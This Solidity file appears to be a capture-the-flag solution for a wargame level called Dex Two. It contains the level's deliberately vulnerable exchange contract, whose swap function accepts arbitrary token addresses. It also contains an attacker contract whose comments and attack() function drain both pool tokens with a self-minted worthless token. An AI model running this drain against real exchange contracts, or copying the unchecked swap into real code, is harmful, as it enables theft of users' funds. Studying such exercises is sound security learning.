// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts/access/Ownable.sol";

contract DexTwo is Ownable {
    address public token1;
    address public token2;

    constructor() {}

    function setTokens(address _token1, address _token2) public onlyOwner {
        token1 = _token1;
        token2 = _token2;
    }

    function add_liquidity(
        address token_address,
        uint amount
    ) public onlyOwner {
        IERC20(token_address).transferFrom(msg.sender, address(this), amount);
    }

    function swap(address from, address to, uint amount) public {
        // you can change any token ,
        require(
            IERC20(from).balanceOf(msg.sender) >= amount,
            "Not enough to swap"
        );
        uint swapAmount = getSwapAmount(from, to, amount);
        IERC20(from).transferFrom(msg.sender, address(this), amount);
        IERC20(to).approve(address(this), swapAmount);
        IERC20(to).transferFrom(address(this), msg.sender, swapAmount);
    }

    function getSwapAmount(
        address from,
        address to,
        uint amount
    ) public view returns (uint) {
        return ((amount * IERC20(to).balanceOf(address(this))) /
            IERC20(from).balanceOf(address(this)));
    }

    function approve(address spender, uint amount) public {
        SwappableTokenTwo(token1).approve(msg.sender, spender, amount);
        SwappableTokenTwo(token2).approve(msg.sender, spender, amount);
    }

    function balanceOf(
        address token,
        address account
    ) public view returns (uint) {
        return IERC20(token).balanceOf(account);
    }
}

contract SwappableTokenTwo is ERC20 {
    address private _dex;

    constructor(
        address dexInstance,
        string memory name,
        string memory symbol,
        uint initialSupply
    ) ERC20(name, symbol) {
        _mint(msg.sender, initialSupply);
        _dex = dexInstance;
    }

    function approve(address owner, address spender, uint256 amount) public {
        require(owner != _dex, "InvalidApprover");
        super._approve(owner, spender, amount);
    }
}

contract hackToken is ERC20 {
    constructor() ERC20("hackIt", "hi") {
        _mint(msg.sender, 5000);
    }
}

contract hackDexTwo {
    // we have to take all the token1 and token2 from the dex
    // you can switch any token
    // the formula to calculate the amount send to you is : amount * to / from
    // first create a token and mint 500 to you ;
    // send 100 newtoken to the contract dextwo
    // approve the token to the contract so the contract can spend it ;
    // call swap with from new token  and to token1 and amount 100;
    // you will get : 100 * 100 / 100 == 100 (all the token in the dex pool)
    // now in the pool we have 200 our token , and 100 token2;
    // call the swap with from new token and to token2 and amount 200:
    // you will get : 200 *100 /200 == 100 (all the token2 in the pool )
    IERC20 public token1;
    IERC20 public token2;
    DexTwo public dexTwo;
    hackToken public token3;

    constructor() {
        token1 = IERC20(0x27EfEA40C1e2aC13AFf470f0fA8FEB162dad8d5c);
        token2 = IERC20(0x1A0e45284be177ec9652dB0c94aad25EB51d4309);
        dexTwo = DexTwo(0xb9096644e3872c8298f75218c7394D59901c80ae);
        token3 = new hackToken();
    }

    function attack() public {
        token3.approve(address(dexTwo), 5000);
        token3.transfer(address(dexTwo), 100);
        dexTwo.swap(address(token3), address(token2), 100);
        dexTwo.swap(address(token3), address(token1), 200);
    }

    function addresstoken3() public view returns (address) {
        return address(token3);
    }
}
